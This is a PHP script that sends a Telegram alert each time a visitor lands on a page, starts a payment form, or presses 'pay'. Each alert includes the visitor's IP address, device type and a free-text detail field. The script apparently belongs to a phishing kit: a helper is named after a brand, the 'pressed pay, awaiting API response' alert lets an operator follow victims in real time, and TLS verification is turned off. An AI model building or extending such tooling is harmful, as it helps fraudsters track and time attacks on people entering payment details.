<?php
/**
 * trackear-ingreso.php — Notifica a Telegram: ingreso, formulario de pago, y presionó pagar.
 * Formato tarjeta. Sin bloqueos.
 */
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { exit(0); }
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { echo json_encode(['ok' => false]); exit; }

require_once __DIR__ . '/includes/app-config.php';
require_once __DIR__ . '/includes/security.php';

$botToken = app_cfg('telegram.bot_token', '');
$chatId = app_cfg('telegram.chat_id_ingresos', '') ?: app_cfg('telegram.chat_id_genericos', '');
if (empty($botToken) || empty($chatId)) { echo json_encode(['ok' => false, 'motivo' => 'sin_config']); exit; }

$raw = json_decode(file_get_contents('php://input'), true) ?: [];
$accionRaw = $raw['accion'] ?? '';

// SOLO notificar: ingreso, paso 2 (rellenando), y presionó pagar. El resto se ignora.
$permitido = (strpos($accionRaw, 'ingreso') !== false)
    || (strpos($accionRaw, 'PASO 2') !== false || strpos($accionRaw, 'paso 2') !== false)
    || (strpos($accionRaw, 'PRESIONO_PAGAR') !== false);
if (!$permitido) { echo json_encode(['ok' => true, 'motivo' => 'ignorado']); exit; }

// Anti-spam por IP+evento (10 min)
$ip = sura_client_ip();
$stampDir = __DIR__ . '/data/ingresos';
if (!is_dir($stampDir)) { @mkdir($stampDir, 0777, true); }
$stampFile = $stampDir . '/' . md5($ip . '|' . $accionRaw . '|' . ($raw['detalle'] ?? '')) . '.txt';
$ahora = time();
if (file_exists($stampFile) && ($ahora - (int)@file_get_contents($stampFile)) < 600) {
    echo json_encode(['ok' => true, 'motivo' => 'rate_limit']); exit;
}

$accion = htmlspecialchars(substr($accionRaw, 0, 80));
$detalle = htmlspecialchars(substr($raw['detalle'] ?? '', 0, 120));
$ua = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 200);
$dispositivo = (preg_match('/Mobile|Android|iPhone/i', $ua)) ? '📱 Móvil' : '💻 PC';
$hora = date('d/m · g:i A');

$esPagar = (strpos($accionRaw, 'PRESIONO_PAGAR') !== false);
$esPaso2 = (strpos($accionRaw, 'PASO 2') !== false || strpos($accionRaw, 'paso 2') !== false);

if ($esPagar) {
    $texto = "┌─────────────────────────\n"
        . "│ 💳 <b>PRESIONÓ PAGAR</b>\n"
        . "│\n"
        . "│ " . $detalle . "\n"
        . "│ ⏳ Esperando respuesta de la API...\n"
        . "│ " . $dispositivo . " · 🌐 " . $ip . "\n"
        . "│ 🕐 " . $hora . "\n"
        . "└─────────────────────────";
} elseif ($esPaso2) {
    $texto = "┌─────────────────────────\n"
        . "│ 📝 <b>FORMULARIO DE PAGO</b>\n"
        . "│\n"
        . "│ " . ($detalle ? $detalle : "✍️ Está rellenando sus datos...") . "\n"
        . "│ " . $dispositivo . " · 🌐 " . $ip . "\n"
        . "│ 🕐 " . $hora . "\n"
        . "└─────────────────────────";
} else {
    $texto = "┌─────────────────────────\n"
        . "│ 🟢 <b>NUEVO INGRESO</b>\n"
        . "│\n"
        . "│ 🌐 " . $ip . "\n"
        . "│ " . $dispositivo . "\n"
        . "│ 🕐 " . $hora . "\n"
        . "└─────────────────────────";
}

$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode(['chat_id' => $chatId, 'text' => $texto, 'parse_mode' => 'HTML']),
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_TIMEOUT => 8,
    CURLOPT_SSL_VERIFYPEER => false,
]);
$tgResp = curl_exec($ch);
$tgErr = curl_error($ch);
curl_close($ch);

$tgData = json_decode((string)$tgResp, true);
if (!empty($tgData['ok'])) {
    @file_put_contents($stampFile, (string)$ahora, LOCK_EX);
    echo json_encode(['ok' => true]);
    exit;
}

@file_put_contents($stampDir . '/errores.log', date('Y-m-d H:i:s') . " | {$ip} | " . ($tgData['description'] ?? $tgErr ?: 'sin_respuesta') . "\n", FILE_APPEND | LOCK_EX);
echo json_encode(['ok' => false, 'motivo' => 'telegram_error']);
